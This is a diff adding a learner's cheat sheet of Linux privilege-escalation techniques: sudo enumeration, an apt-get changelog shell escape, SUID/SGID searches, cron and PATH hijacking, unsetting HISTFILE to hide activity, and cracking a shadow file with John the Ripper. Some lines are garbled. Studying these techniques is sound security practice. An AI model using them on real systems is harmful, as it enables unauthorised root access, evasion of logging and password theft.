@@ -1,0 +1,40 @@
+sudo -l  #see what commands you can run with escalated privileges
+gtfobins - IMPORTANT WEBSITE!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+sudo apt-get changelog apt  #the command we found through sudo -l was apt-get which we put into the website and got this method
+!/bin/sh
+
+find / -type f -perm /4000 -ls 2>/dev/null   #looks for files with the suid bit set
+
+find / -type f -perm /2000 -ls 2>/dev/null   #looks for files with the sgid bit set
+
+find / -type f -perm /6000 -ls 2>/dev/null   #looks for files with the suid bit set or the sgid bit set
+
+crontab.guru  #nice website that is really helpful if you forget how to cron
+
+cd /etc/cron.hourly
+sudo apt-get changelog apt
+
+#/bin/bash
+
+script(
+#!/bin/bash
+
+whoami > /var/tmp/output.txt
+)
+
+crontab -l  #lists out the crontab for that specific user
+/var/spool/cron/crontabs  #that is the location where that user's crontab would be saved
+crontab -l -u <username>   #checks the crontab for specified user
+
+tmp and var/tmp are world writable so they can always be written to
+
+echo $PATH  #places it looks for things like commands
+
+export PATH=.:$PATH   #puts a dot in our path which makes it look it our current working directory
+
+unset HISTFILE
+sudo .bash_history
+
+sudo apt-get john -y
+john --wordlist="myWordList.txt" shadowfilehere
